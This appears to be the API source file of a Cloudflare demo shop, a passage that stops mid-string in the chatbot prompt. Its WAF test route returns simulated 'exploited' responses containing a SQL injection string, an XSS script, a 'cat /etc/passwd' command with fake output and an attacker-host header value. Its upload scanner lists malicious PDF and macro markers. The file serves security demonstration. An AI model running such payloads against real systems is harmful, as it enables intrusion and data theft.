// /functions/api/[[path]].ts
// Single Hono app handling all API routes for the Cloudflare Demo Shop.
//
// Routes (v2 — Astro rebuild):
//   GET  /api/waf/testattack?type=sqli|xss|cmdi|header  — WAF attack target
//   GET  /api/rate-limit-test                            — Rate-limit target
//   GET  /api/debug-headers                              — Header dump
//   POST /api/r2/upload                                  — Upload (guest + email), malicious scan
//   GET  /api/kv/demo                                    — List demo KV keys (demo-kv: prefix)
//   GET  /api/kv/demo/:key                               — Get a demo KV value
//   PUT  /api/kv/demo/:key                               — Set a demo KV value
//   DELETE /api/kv/demo/:key                             — Delete a demo KV value
//   GET  /api/d1/demo/products                           — All products (D1)
//   GET  /api/d1/demo/query?preset=...                   — Preset parameterized D1 query
//   GET  /api/diagrams/list                              — List diagrams (R2)
//   PUT  /api/diagrams/:name/tags                        — Set tags (KV)
//   GET  /api/diagrams/:name                             — Stream diagram (cached)
//   POST /api/cache/purge                                — Real CF Cache Purge API call
//   POST /api/turnstile/verify                           — siteverify call
//   POST /api/chat                                       — AI Gateway → Llama 3.3 70B
//   POST /api/aboutme-rag                                — Service binding → AI Search / AutoRAG Worker
//   POST /api/email/send                                 — Email Sending: fixed message → visitor-entered address
//
// Legacy aliases kept for backwards compat:
//   GET /api/waf-test?attack=...  → forwards to /api/waf/testattack

import { Hono, Context, Next } from "hono";
import { cors } from "hono/cors";

// ── Types ─────────────────────────────────────────────────────

type Bindings = {
  STORAGE_BUCKET: R2Bucket;
  DIAGRAMS_BUCKET: R2Bucket;
  DEMO_KV: KVNamespace;
  demo_d1: D1Database;
  AI: Ai;
  AIG_TOKEN: string;
  ABOUTME_RAG?: Fetcher;
  CHAT_ROOM: DurableObjectNamespace;
  CF_ZONE_ID?: string;
  CF_CACHE_PURGE_TOKEN?: string;
  TURNSTILE_SECRET?: string;
  TURNSTILE_SITE_KEY?: string;
  EMAIL: SendEmail;
};

type Variables = {
  userEmail: string;
  inspector: {
    request: {
      method: string;
      url: string;
      headers: Record<string, string | null>;
    };
  };
};

const app = new Hono<{ Bindings: Bindings; Variables: Variables }>();

// ── Constants ─────────────────────────────────────────────────

// R2 demo upload constraints — 50MB, restricted file types
const MAX_FILE_SIZE = 50 * 1024 * 1024;

const ALLOWED_EXTENSIONS = new Set([
  "pdf", "csv", "png", "jpg", "jpeg", "gif",
  "doc", "docx", "ppt", "pptx", "txt",
]);

// Allowed MIME types per extension (for type/extension consistency check)
const EXTENSION_MIME_MAP: Record<string, string[]> = {
  pdf:  ["application/pdf"],
  csv:  ["text/csv", "application/csv", "application/vnd.ms-excel", "text/plain"],
  png:  ["image/png"],
  jpg:  ["image/jpeg"],
  jpeg: ["image/jpeg"],
  gif:  ["image/gif"],
  doc:  ["application/msword"],
  docx: ["application/vnd.openxmlformats-officedocument.wordprocessingml.document"],
  ppt:  ["application/vnd.ms-powerpoint"],
  pptx: ["application/vnd.openxmlformats-officedocument.presentationml.presentation"],
  txt:  ["text/plain"],
};

// Magic bytes (file signature) per format
const MAGIC_BYTES: Record<string, number[][]> = {
  pdf:  [[0x25, 0x50, 0x44, 0x46]],                     // %PDF
  png:  [[0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]],
  jpg:  [[0xff, 0xd8, 0xff]],
  jpeg: [[0xff, 0xd8, 0xff]],
  gif:  [[0x47, 0x49, 0x46, 0x38, 0x37, 0x61], [0x47, 0x49, 0x46, 0x38, 0x39, 0x61]],
  doc:  [[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]], // OLE compound
  ppt:  [[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]],
  docx: [[0x50, 0x4b, 0x03, 0x04]],                     // ZIP
  pptx: [[0x50, 0x4b, 0x03, 0x04]],
};

const INSPECT_KEYS = [
  "host", "user-agent", "accept", "cf-ray", "cf-connecting-ip",
  "cf-ipcountry", "x-forwarded-for", "x-forwarded-proto",
  "x-test-injection", "x-override-host", "x-cache-poison",
];

// Email Service demo — fixed sender + fixed template. Only the recipient
// (entered by the visitor) varies. Replying lands on support@remydemo.com,
// which an existing Email Routing rule forwards to the demo owner's inbox.
const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

const DEMO_EMAIL_HTML = `
  <div style="font-family: sans-serif; max-width: 480px; margin: 0 auto;">
    <h2 style="color: #0d3b34;">Thanks for reaching out</h2>
    <p>This is a demo message sent with <strong>Cloudflare Email Sending</strong>
    from <code>support@remydemo.com</code>.</p>
    <p>Reply to this email and <strong>Cloudflare Email Routing</strong> will
    forward your reply to our support inbox — no mail server required.</p>
    <p style="color: #6b7280; font-size: 13px;">— Cloudflare Demo Shop</p>
  </div>
`;

const DEMO_EMAIL_TEXT =
  "Thanks for reaching out.\n\n" +
  "This is a demo message sent with Cloudflare Email Sending from support@remydemo.com.\n\n" +
  "Reply to this email and Cloudflare Email Routing will forward your reply to our " +
  "support inbox — no mail server required.\n\n" +
  "— Cloudflare Demo Shop";

const ACCESS_HEADER_VARIANTS = [
  "cf-access-authenticated-user-email",
  "Cf-Access-Authenticated-User-Email",
  "CF-Access-Authenticated-User-Email",
  "x-forwarded-user",
];

// ── JWT helpers ───────────────────────────────────────────────

function getCookie(request: Request, name: string): string | undefined {
  const cookieHeader = request.headers.get("Cookie");
  if (!cookieHeader) return undefined;
  for (const part of cookieHeader.split(";")) {
    const [key, value] = part.trim().split("=");
    if (key === name) return value;
  }
  return undefined;
}

function base64UrlDecode(str: string): string {
  let base64 = str.replace(/-/g, "+").replace(/_/g, "/");
  const padding = "=".repeat((4 - (base64.length % 4)) % 4);
  base64 += padding;
  return atob(base64);
}

function base64UrlDecodeToBytes(str: string): Uint8Array {
  const decoded = base64UrlDecode(str);
  const bytes = new Uint8Array(decoded.length);
  for (let i = 0; i < decoded.length; i++) bytes[i] = decoded.charCodeAt(i);
  return bytes;
}

async function verifyAccessToken(token: string, domain: string): Promise<{ email: string } | null> {
  try {
    const parts = token.split(".");
    if (parts.length !== 3) return null;
    const [headerB64, payloadB64, signatureB64] = parts;
    const header = JSON.parse(base64UrlDecode(headerB64));
    if (!header.kid || !header.alg) return null;

    const jwksUrl = `https://${domain}/cdn-cgi/access/certs`;
    const jwksResponse = await fetch(jwksUrl);
    if (!jwksResponse.ok) return null;
    const jwks: any = await jwksResponse.json();
    if (!jwks.keys || !Array.isArray(jwks.keys)) return null;

    const key = jwks.keys.find((k: any) => k.kid === header.kid);
    if (!key) return null;

    const publicKey = await crypto.subtle.importKey(
      "jwk",
      { kty: key.kty, n: key.n, e: key.e, alg: key.alg },
      { name: "RSASSA-PKCS1-v1_5", hash: "SHA-256" },
      false,
      ["verify"]
    );

    const data = new TextEncoder().encode(`${headerB64}.${payloadB64}`);
    const signature = base64UrlDecodeToBytes(signatureB64);
    const isValid = await crypto.subtle.verify(
      "RSASSA-PKCS1-v1_5",
      publicKey,
      signature,
      data
    );
    if (!isValid) return null;

    const payload = JSON.parse(base64UrlDecode(payloadB64));
    if (payload.exp && payload.exp * 1000 < Date.now()) return null;
    if (payload.nbf && payload.nbf * 1000 > Date.now()) return null;

    const email = payload.email || payload.custom?.email;
    return email ? { email } : null;
  } catch (err) {
    console.error("JWT verification error:", err);
    return null;
  }
}

// ── Middleware ────────────────────────────────────────────────

app.use("*", cors({ origin: "*" }));

app.use("*", async (c, next) => {
  c.set("inspector", {
    request: {
      method: c.req.method,
      url: c.req.url,
      headers: Object.fromEntries(INSPECT_KEYS.map((k) => [k, c.req.header(k)])),
    },
  });
  await next();
});

const requireAccessAuth = async (c: Context<{ Bindings: Bindings; Variables: Variables }>, next: Next) => {
  let userEmail = ACCESS_HEADER_VARIANTS.map((h) => c.req.header(h)).find((v) => !!v);

  if (!userEmail) {
    const token = getCookie(c.req.raw, "CF_Authorization");
    if (token) {
      const host = c.req.header("host") || "remydemo.com";
      const verified = await verifyAccessToken(token, host);
      if (verified) userEmail = verified.email;
    }
  }

  if (!userEmail) {
    return c.json(
      { authenticated: false, error: "No authenticated user found" },
      401
    );
  }

  c.set("userEmail", userEmail);
  await next();
};

// ── WAF Test ──────────────────────────────────────────────────
// Primary endpoint: GET /api/waf/testattack?type=sqli|xss|cmdi|header
// Legacy alias:    GET /api/waf-test?attack=...

function wafResponse(c: Context, attack: string | undefined) {
  const inspector = c.get("inspector");

  switch (attack) {
    case "sqli":
      return c.json({
        attack: "sqli",
        status: "exploited",
        message: "Database query returned all rows. Credentials exposed.",
        data: {
          query_used: "SELECT * FROM users WHERE id='' OR '1'='1'",
          rows_returned: 3,
          users: [
            { username: "demo_user",   password: "fake_pass_123",   cc: "4532-0000-1111-2222" },
            { username: "test_admin",  password: "demo_password",   cc: "5105-0000-3333-4444" },
            { username: "john_sample", password: "sample_pass_456", cc: "4916-0000-5555-6666" },
          ],
        },
        inspector,
      });

    case "xss":
      return c.json({
        attack: "xss",
        status: "exploited",
        message: "Script executed in victim browser. Session data stolen.",
        data: {
          script_executed: "<script>alert('XSS')</script>",
          stolen: {
            session_id:  "demo_abc123xyz",
            user_token:  "fake_jwt_token_456def",
            auth_cookie: "auth=demo_cookie_789ghi",
          },
        },
        inspector,
      });

    case "cmdi":
      return c.json({
        attack: "cmdi",
        status: "exploited",
        message: "OS command executed on origin server. System files exposed.",
        data: {
          command_run: "cat /etc/passwd",
          output: [
            "root:x:0:0:root:/root:/bin/bash",
            "www-data:x:33:33:www-data:/var/www:/bin/sh",
            "demo-user:x:1000:1000:Demo User:/home/demo:/bin/bash",
            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
          ],
        },
        inspector,
      });

    case "header": {
      const rh = inspector.request.headers;
      return c.json({
        attack: "header",
        status: "exploited",
        message: "Malicious headers accepted. Cache poisoned for all visitors.",
        data: {
          injected_headers: {
            "X-Test-Injection": rh["x-test-injection"] || "malicious-payload (simulated)",
            "X-Override-Host":  rh["x-override-host"]  || "evil.demo-attacker.com (simulated)",
            "X-Cache-Poison":   rh["x-cache-poison"]   || "true (simulated)",
          },
          effect: "All cached responses now serve attacker-controlled content to every visitor.",
        },
        inspector,
      });
    }

    default:
      return c.json({ error: "Unknown attack type.", inspector }, 400);
  }
}

app.get("/api/waf/testattack", (c) => wafResponse(c, c.req.query("type")));
app.get("/api/waf-test", (c) => wafResponse(c, c.req.query("attack"))); // legacy alias

// ── Rate Limiting ─────────────────────────────────────────────

app.get("/api/rate-limit-test", (c) => {
  return c.json({
    status: "allowed",
    message: "Request successful.",
    timestamp: Date.now(),
  });
});

// ── Debug Headers ─────────────────────────────────────────────

app.get("/api/debug-headers", (c) => {
  const headers: Record<string, string> = {};
  for (const [key, value] of c.req.raw.headers.entries()) headers[key] = value;
  return c.json({
    headers,
    url: c.req.url,
    method: c.req.method,
  });
});

// ── Malicious file scanning ───────────────────────────────────

interface ScanResult {
  status: "clean" | "malicious";
  reasons: string[];
}

function getExtension(filename: string): string {
  const parts = filename.toLowerCase().split(".");
  return parts.length > 1 ? parts[parts.length - 1] : "";
}

function checkMagicBytes(bytes: Uint8Array, ext: string): boolean {
  const signatures = MAGIC_BYTES[ext];
  if (!signatures) return true; // no signature to check (txt, csv)
  return signatures.some((sig) =>
    sig.every((byte, i) => bytes[i] === byte)
  );
}

function scanPdfForDanger(bytes: Uint8Array): string[] {
  const text = new TextDecoder("latin1").decode(bytes);
  const reasons: string[] = [];
  const danger = ["/JS", "/JavaScript", "/OpenAction", "/Launch", "/EmbeddedFile"];
  for (const keyword of danger) {
    if (text.includes(keyword)) reasons.push(`PDF contains '${keyword}' (potentially malicious)`);
  }
  return reasons;
}

function scanOfficeForMacros(bytes: Uint8Array): string[] {
  const text = new TextDecoder("latin1").decode(bytes);
  const reasons: string[] = [];
  // OLE (.doc / .ppt)
  if (text.includes("_VBA_PROJECT") || text.includes("VBA_PROJECT_CUR")) {
    reasons.push("Office file contains a VBA macro project");
  }
  // OOXML (.docx / .pptx) — would contain word/vbaProject.bin or similar
  if (text.includes("vbaProject.bin")) {
    reasons.push("OOXML file contains vbaProject.bin (macros embedded)");
  }
  return reasons;
}

async function scanFile(
  buffer: ArrayBuffer,
  filename: string,
  declaredMime: string
): Promise<ScanResult> {
  const reasons: string[] = [];
  const bytes = new Uint8Array(buffer);
  const ext = getExtension(filename);

  // 1. Extension allowlist
  if (!ALLOWED_EXTENSIONS.has(ext)) {
    reasons.push(`Extension '.${ext}' is not in the allowed list`);
  }

  // 2. MIME ↔ extension consistency
  const expectedMimes = EXTENSION_MIME_MAP[ext];
  if (expectedMimes && declaredMime && !expectedMimes.includes(declaredMime)) {
    // Lenient: only flag if it's a serious mismatch (e.g. image/png declared as application/x-msdownload)
    if (declaredMime.startsWith("application/x-") || declaredMime.includes("executable")) {
      reasons.push(`Declared MIME ${declaredMime} does not match expected type for .${ext}`);
    }
  }

  // 3. Magic-bytes check
  if (ALLOWED_EXTENSIONS.has(ext) && !checkMagicBytes(bytes, ext)) {
    reasons.push(`File magic bytes do not match .${ext} format`);
  }

  // 4. PDF-specific scans
  if (ext === "pdf") {
    reasons.push(...scanPdfForDanger(bytes));
  }

  // 5. Office macro scans
  if (["doc", "docx", "ppt", "pptx"].includes(ext)) {
    reasons.push(...scanOfficeForMacros(bytes));
  }

  return {
    status: reasons.length > 0 ? "malicious" : "clean",
    reasons,
  };
}

// ── R2: Upload ────────────────────────────────────────────────
// Guest upload: the form field 'guestEmail' provides the attribution email.
// (Cloudflare Access headers/cookie are still honored if present, so an
//  authenticated visitor is attributed by their real email — but no auth is
//  required to upload.)

interface FileMetadata {
  fileId: string;
  uploadedBy: string;       // Access email OR guest email
  uploadedAt: number;
  originalName: string;
  size: number;
  contentType: string;
  r2Key: string;
  scanStatus: "clean" | "malicious";
  scanReasons?: string[];
  uploadMode: "access" | "guest";
}

interface FileWithTier extends FileMetadata {
  tier: "standard" | "infrequent";
}

function sanitizeFilename(filename: string): string {
  return filename
    .replace(/[^a-zA-Z0-9.-]/g, "_")
    .replace(/_{2,}/g, "_")
    .replace(/^_|_$/g, "");
}

// Get email — try Access first, fall back to guestEmail field
async function getUploadIdentity(c: Context<{ Bindings: Bindings; Variables: Variables }>, formData: FormData): Promise<{ email: string; mode: "access" | "guest" } | null> {
  // Try Access
  let email = ACCESS_HEADER_VARIANTS.map((h) => c.req.header(h)).find((v) => !!v);
  if (!email) {
    const token = getCookie(c.req.raw, "CF_Authorization");
    if (token) {
      const host = c.req.header("host") || "remydemo.com";
      const verified = await verifyAccessToken(token, host);
      if (verified) email = verified.email;
    }
  }
  if (email) return { email, mode: "access" };

  // Fall back to guest email
  const guestEmail = formData.get("guestEmail");
  if (typeof guestEmail === "string" && /\S+@\S+\.\S+/.test(guestEmail)) {
    return { email: guestEmail, mode: "guest" };
  }

  return null;
}

app.post("/api/r2/upload", async (c) => {
  try {
    const formData = await c.req.formData();
    const identity = await getUploadIdentity(c, formData);

    if (!identity) {
      return c.json(
        { error: "Provide a valid email so the upload can be attributed to you." },
        400
      );
    }

    const file = formData.get("file");
    if (!file || !(file instanceof File)) {
      return c.json({ error: "No file provided" }, 400);
    }

    if (file.size === 0) {
      return c.json({ error: "Empty file" }, 400);
    }

    if (file.size > MAX_FILE_SIZE) {
      return c.json({
        error: `File too large. Maximum size is ${MAX_FILE_SIZE / (1024 * 1024)}MB.`,
      }, 400);
    }

    const ext = getExtension(file.name);
    if (!ALLOWED_EXTENSIONS.has(ext)) {
      return c.json({
        error: `File type .${ext || "(none)"} not allowed. Allowed: pdf, csv, png, jpg, jpeg, gif, doc, docx, ppt, pptx, txt.`,
      }, 400);
    }

    const arrayBuffer = await file.arrayBuffer();

    // Malicious content scan on full buffer
    const scan = await scanFile(arrayBuffer, file.name, file.type);
    if (scan.status === "malicious") {
      return c.json({
        success: false,
        scanStatus: "malicious",
        error: "Malicious content detected — upload rejected.",
        scanDetails: { reasons: scan.reasons },
      }, 400);
    }

    const timestamp = Date.now();
    const randomId = Math.random().toString(36).substring(2, 15);
    const fileId = `${timestamp}_${randomId}`;
    const r2Key = `${timestamp}_${randomId}_${sanitizeFilename(file.name)}`;

    const metadata: FileMetadata = {
      fileId,
      uploadedBy: identity.email,
      uploadedAt: timestamp,
      originalName: file.name,
      size: file.size,
      contentType: file.type || "application/octet-stream",
      r2Key,
      scanStatus: "clean",
      scanReasons: [],
      uploadMode: identity.mode,
    };

    await c.env.STORAGE_BUCKET.put(r2Key, arrayBuffer, {
      httpMetadata: {
        contentType: metadata.contentType,
        contentDisposition: `attachment; filename="${file.name}"`,
      },
      customMetadata: {
        uploadedBy: identity.email,
        originalName: file.name,
        fileId,
        uploadMode: identity.mode,
      },
    });

    return c.json({
      success: true,
      fileId,
      filename: file.name,
      size: file.size,
      uploadedAt: timestamp,
      uploadMode: identity.mode,
      scanStatus: "clean",
      message: "File uploaded successfully",
    });
  } catch (error: any) {
    console.error("Upload error:", error);
    return c.json({ error: "Upload failed: " + error.message }, 500);
  }
});

// ── KV demo: global key-value store ──────────────────────────
// Simple CRUD over DEMO_KV using a "demo-kv:" prefix so it never collides
// with other KV usage. Demonstrates: instant edge reads, writes that
// propagate worldwide in seconds, eventual consistency.

const KV_DEMO_PREFIX = "demo-kv:";
const KV_KEY_RE = /^[a-zA-Z0-9._:-]{1,128}$/;

app.get("/api/kv/demo", async (c) => {
  try {
    const list = await c.env.DEMO_KV.list({ prefix: KV_DEMO_PREFIX, limit: 100 });
    const entries = await Promise.all(
      list.keys.map(async (k) => ({
        key: k.name.slice(KV_DEMO_PREFIX.length),
        value: await c.env.DEMO_KV.get(k.name),
      }))
    );
    entries.sort((a, b) => a.key.localeCompare(b.key));
    return c.json({ keys: entries, count: entries.length });
  } catch (error: any) {
    return c.json({ error: "KV list failed: " + error.message }, 500);
  }
});

app.get("/api/kv/demo/:key", async (c) => {
  try {
    const key = c.req.param("key");
    if (!KV_KEY_RE.test(key)) return c.json({ error: "Invalid key" }, 400);
    const value = await c.env.DEMO_KV.get(KV_DEMO_PREFIX + key);
    if (value === null) return c.json({ key, found: false, value: null });
    return c.json({ key, found: true, value });
  } catch (error: any) {
    return c.json({ error: "KV get failed: " + error.message }, 500);
  }
});

app.put("/api/kv/demo/:key", async (c) => {
  try {
    const key = c.req.param("key");
    if (!KV_KEY_RE.test(key)) return c.json({ error: "Invalid key — use letters, numbers, . _ : - (max 128 chars)" }, 400);
    const body = await c.req.json().catch(() => ({}));
    const value = typeof body.value === "string" ? body.value : "";
    if (value.length > 1024) return c.json({ error: "Value too long (max 1024 chars for the demo)" }, 400);
    await c.env.DEMO_KV.put(KV_DEMO_PREFIX + key, value);
    return c.json({ success: true, key, value });
  } catch (error: any) {
    return c.json({ error: "KV put failed: " + error.message }, 500);
  }
});

app.delete("/api/kv/demo/:key", async (c) => {
  try {
    const key = c.req.param("key");
    if (!KV_KEY_RE.test(key)) return c.json({ error: "Invalid key" }, 400);
    await c.env.DEMO_KV.delete(KV_DEMO_PREFIX + key);
    return c.json({ success: true, key });
  } catch (error: any) {
    return c.json({ error: "KV delete failed: " + error.message }, 500);
  }
});

// ── D1 demo: serverless SQL ──────────────────────────────────
// Read-only preset queries against a seeded `products` table.
// Each response echoes the SQL + bindings so the UI can teach.

app.get("/api/d1/demo/products", async (c) => {
  try {
    const sql = "SELECT id, name, category, price, stock FROM products ORDER BY id";
    const { results } = await c.env.demo_d1.prepare(sql).all();
    return c.json({ sql, bindings: [], rows: results ?? [], count: results?.length ?? 0 });
  } catch (error: any) {
    return c.json({ error: "D1 query failed: " + error.message }, 500);
  }
});

app.get("/api/d1/demo/query", async (c) => {
  try {
    const preset = c.req.query("preset") || "all";
    let sql = "";
    let bindings: (string | number)[] = [];

    if (preset === "all") {
      sql = "SELECT id, name, category, price, stock FROM products ORDER BY id";
    } else if (preset === "by_category") {
      const category = c.req.query("category") || "Audio";
      sql = "SELECT id, name, category, price, stock FROM products WHERE category = ? ORDER BY price";
      bindings = [category];
    } else if (preset === "under_price") {
      const price = Number(c.req.query("price") || "50");
      sql = "SELECT id, name, category, price, stock FROM products WHERE price < ? ORDER BY price";
      bindings = [Number.isFinite(price) ? price : 50];
    } else if (preset === "cheapest_per_category") {
      sql = "SELECT category, name, MIN(price) AS price FROM products GROUP BY category ORDER BY price";
    } else {
      return c.json({ error: "Unknown preset. Use: all, by_category, under_price, cheapest_per_category." }, 400);
    }

    const stmt = bindings.length ? c.env.demo_d1.prepare(sql).bind(...bindings) : c.env.demo_d1.prepare(sql);
    const { results, meta } = await stmt.all();
    return c.json({
      preset,
      sql,
      bindings,
      rows: results ?? [],
      count: results?.length ?? 0,
      rowsRead: meta?.rows_read ?? null,
    });
  } catch (error: any) {
    return c.json({ error: "D1 query failed: " + error.message }, 500);
  }
});

// ── Diagrams: list / set-tags / view ────────────────────────

interface DiagramMetadata {
  name: string;
  tags: string[];
  size: number;
  uploaded: string | null;
}

app.get("/api/diagrams/list", async (c) => {
  try {
    const objects = await c.env.DIAGRAMS_BUCKET.list();
    const diagrams: DiagramMetadata[] = [];
    for (const obj of objects.objects) {
      const tagsRaw = (await c.env.DEMO_KV.get(`diagram_tags:${obj.key}`)) || "";
      const tags = tagsRaw.split(",").map((t) => t.trim()).filter((t) => t.length > 0);
      diagrams.push({
        name: obj.key,
        tags,
        size: obj.size,
        uploaded: obj.uploaded?.toISOString() || null,
      });
    }
    return c.json({ diagrams, count: diagrams.length });
  } catch (error: any) {
    return c.json({ error: "Failed to list diagrams: " + error.message }, 500);
  }
});

app.put("/api/diagrams/:name/tags", async (c) => {
  try {
    const name = c.req.param("name");
    const { tags } = await c.req.json();
    if (typeof tags !== "string") {
      return c.json({ error: "Tags must be a comma-separated string" }, 400);
    }
    const object = await c.env.DIAGRAMS_BUCKET.head(name);
    if (!object) return c.json({ error: "Diagram not found" }, 404);
    await c.env.DEMO_KV.put(`diagram_tags:${name}`, tags);
    return c.json({
      success: true,
      name,
      tags: tags.split(",").map((t) => t.trim()).filter((t) => t.length > 0),
    });
  } catch (error: any) {
    return c.json({ error: "Failed to set tags: " + error.message }, 500);
  }
});

app.get("/api/diagrams/:name", async (c) => {
  try {
    const name = c.req.param("name");
    const object = await c.env.DIAGRAMS_BUCKET.get(name);
    if (!object) return c.json({ error: "Diagram not found" }, 404);
    const headers = new Headers();
    object.writeHttpMetadata(headers);
    headers.set("Content-Type", "image/png");
    headers.set("Cache-Control", "public, max-age=3600");
    return new Response(object.body, { headers });
  } catch (error: any) {
    return c.json({ error: "Failed to fetch diagram: " + error.message }, 500);
  }
});

// ── Cache Purge (real CF API call) ──────────────────────────
// Requires:
//   CF_ZONE_ID            (env var)
//   CF_CACHE_PURGE_TOKEN  (secret — API token with Zone:Cache Purge)

app.post("/api/cache/purge", async (c) => {
  try {
    if (!c.env.CF_ZONE_ID || !c.env.CF_CACHE_PURGE_TOKEN) {
      return c.json({
        error: "Cache purge not configured. Set CF_ZONE_ID and CF_CACHE_PURGE_TOKEN.",
      }, 500);
    }

    const { files, purge_everything } = await c.req.json();

    if (!purge_everything && (!Array.isArray(files) || files.length === 0)) {
      return c.json({ error: "Provide 'files' array or 'purge_everything: true'" }, 400);
    }

    const body = purge_everything
      ? { purge_everything: true }
      : { files };

    const res = await fetch(
      `https://api.cloudflare.com/client/v4/zones/${c.env.CF_ZONE_ID}/purge_cache`,
      {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${c.env.CF_CACHE_PURGE_TOKEN}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify(body),
      }
    );

    const data: any = await res.json();
    if (!res.ok || !data.success) {
      return c.json({
        success: false,
        error: data.errors?.[0]?.message ?? "Purge failed",
        cfResponse: data,
      }, 500);
    }

    return c.json({ success: true, purged: files ?? "everything", cfResponse: data });
  } catch (error: any) {
    return c.json({ error: "Purge failed: " + error.message }, 500);
  }
});

// ── Turnstile siteverify ────────────────────────────────────
// Cloudflare's public test keys (documented at
// https://developers.cloudflare.com/turnstile/troubleshooting/testing/):
//   Sitekeys:
//     1x00000000000000000000AA — always passes (visible widget)
//     2x00000000000000000000AB — always fails (visible widget)
//     3x00000000000000000000FF — forces an interactive challenge (visible)
//   Secrets:
//     1x0000000000000000000000000000000AA — always passes validation
//     2x0000000000000000000000000000000AA — always fails validation
// In production, set TURNSTILE_SITE_KEY / TURNSTILE_SECRET (wrangler.toml
// [vars] + Pages secret) to your real widget's sitekey/secret.
//
// The /turnstile/login demo drives four fixed scenarios (human,
// human-test, interactive, blocked). Both the sitekey AND the secret used
// to verify it are chosen here, server-side, from a fixed map — the
// browser only ever sends a scenario *name*, never a key, so a visitor
// can't pick their own sitekey/secret pairing.
const TURNSTILE_SCENARIOS = {
  // A trusted visitor: the production widget (or the public "always
  // passes" test key/secret pair when TURNSTILE_SITE_KEY isn't set).
  //
  // NOTE (confirmed root cause, don't relitigate): this zone had Precursor
  // (https://developers.cloudflare.com/cloudflare-challenges/precursor/)
  // set to "Maximize Security". That mode continuously re-validates
  // session behavior and, whenever it decides to re-verify, requires the
  // request to already carry a currently-valid cf_clearance cookie —
  // otherwise it serves a fresh interstitial Challenge (`cf-mitigated:
  // challenge`, raw HTML body). A bare fetch() can never solve a fresh
  // Challenge (no page render), so whichever /api/turnstile/verify call
  // happened to land during a re-verification window failed with
  // "Unexpected token '<'" — regardless of scenario or token
  // length/content (verified: even the "human-test" scenario's short
  // dummy token failed under the same conditions). This is NOT a WAF rule
  // and NOT related to the real widget's token being long/opaque — both
  // earlier theories were wrong; keeping this note so nobody re-derives
  // them from scratch.
  //
  // Fix applied at the zone level: switch Precursor to "Minimize Friction"
  // globally (or add a Precursor Rule scoping "Minimize Friction" to
  // /api/* specifically while keeping "Maximize Security" elsewhere, per
  // Cloudflare's own recommended pattern for mixed HTML/API zones). No
  // code change fixes this — it's a Security → Settings → Precursor
  // configuration, not something this endpoint can control.
  human: {
    siteKey: (env: Bindings) => env.TURNSTILE_SITE_KEY || "1x00000000000000000000AA",
    secret: (env: Bindings) => env.TURNSTILE_SECRET || "1x0000000000000000000000000000000AA",
  },
  // Same "trusted human" UX (invisible, instant pass) but forced onto
  // Cloudflare's public always-passes test key/secret pair even when a
  // real production TURNSTILE_SITE_KEY is configured. NOTE: this is NOT
  // immune to the Precursor issue described above — under "Maximize
  // Security" any /api/turnstile/verify fetch() can be caught mid
  // re-verification regardless of scenario. It's kept as a convenience
  // for demos that don't need the real production widget, not as a
  // workaround for Precursor.
  "human-test": {
    siteKey: () => "1x00000000000000000000AA",
    secret: () => "1x0000000000000000000000000000000AA",
  },
  // A visitor Turnstile is unsure about: forces the interactive checkbox
  // challenge. Once solved it issues the same dummy token as the
  // always-passes test key, so pair it with the always-passes test secret.
  interactive: {
    siteKey: () => "3x00000000000000000000FF",
    secret: () => "1x0000000000000000000000000000000AA",
  },
  // A confirmed bot: the widget always fails client-side and never issues
  // a token in normal use. If a request is forged directly to this
  // endpoint anyway, the always-fails test secret rejects it too.
  blocked: {
    siteKey: () => "2x00000000000000000000AB",
    secret: () => "2x0000000000000000000000000000000AA",
  },
} as const;

type TurnstileScenario = keyof typeof TURNSTILE_SCENARIOS;

function resolveTurnstileScenario(input: unknown): TurnstileScenario {
  return input === "human-test" || input === "interactive" || input === "blocked"
    ? input
    : "human";
}

// Exposes the sitekey for a given scenario to the client-side demo. Site
// keys are always public (visible in HTML/JS either way); routing through
// here keeps the server as the sole source of truth for which key maps to
// which scenario, and lets the production key rotate via wrangler.toml
// [vars] without rebuilding the Astro component.
app.get("/api/turnstile/config", (c) => {
  const scenario = resolveTurnstileScenario(c.req.query("scenario"));
  const cfg = TURNSTILE_SCENARIOS[scenario];
  return c.json({
    scenario,
    siteKey: cfg.siteKey(c.env),
    usingTestKey: scenario !== "human" || !c.env.TURNSTILE_SITE_KEY,
  });
});

app.post("/api/turnstile/verify", async (c) => {
  try {
    const { token, scenario: rawScenario } = await c.req.json();
    if (!token) return c.json({ success: false, error: "Missing token" }, 400);

    const scenario = resolveTurnstileScenario(rawScenario);
    const secret = TURNSTILE_SCENARIOS[scenario].secret(c.env);
    const remoteip = c.req.header("cf-connecting-ip") || "";

    const form = new FormData();
    form.append("secret", secret);
    form.append("response", token);
    if (remoteip) form.append("remoteip", remoteip);

    const res = await fetch(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      { method: "POST", body: form }
    );
    const data: any = await res.json();

    return c.json({
      success: data.success === true,
      scenario,
      siteverify: data,
      usingTestSecret: scenario !== "human" || !c.env.TURNSTILE_SECRET,
    });
  } catch (error: any) {
    return c.json({ success: false, error: "Verify failed: " + error.message }, 500);
  }
});

// ── AI Chatbot (AI Gateway → Workers AI) ───────────────────

app.post("/api/chat", async (c) => {
  try {
    const { messages } = await c.req.json();
    if (!Array.isArray(messages) || messages.length === 0) {
      return c.json({ error: "Messages array required" }, 400);
    }
    if (!c.env.AIG_TOKEN) {
      return c.json({ error: "AIG_TOKEN not configured" }, 500);
    }

    const systemPrompt = `You are a helpful assistant for the Cloudflare Demo Shop at remydemo.com.
You help users explore Cloudflare products and find demos.

The site is organized into four pillars, with these solution pages (URLs are top-level slugs):

SASE / Workspace Security:
  - /zero-trust            — Zero Trust Access (VPN replacement)
  - /secure-web-gateway    — Secure Web Gateway
  - /browser-isolation     — Browser Isolation (external link demo)
  - /casb                  — CASB, Shadow IT, Shadow AI, DLP
  - /email-security        — Email Security

App Security & Performance:
  - /waf                   — WAF (interactive demo)
  - /bot-management        — Bot Management & Rate Limiting (interactive)
  - /api-security          — API Security
  - /client-side-security  — Client-Side Security (Page Shield)
  - /l7-ddos               — Layer 7 DDoS Protection
  - /turnstile             — Turnstile (interactive)
  - /cdn-caching           — CDN & Caching (interactive)
  - /argo                  — Argo Smart Routing
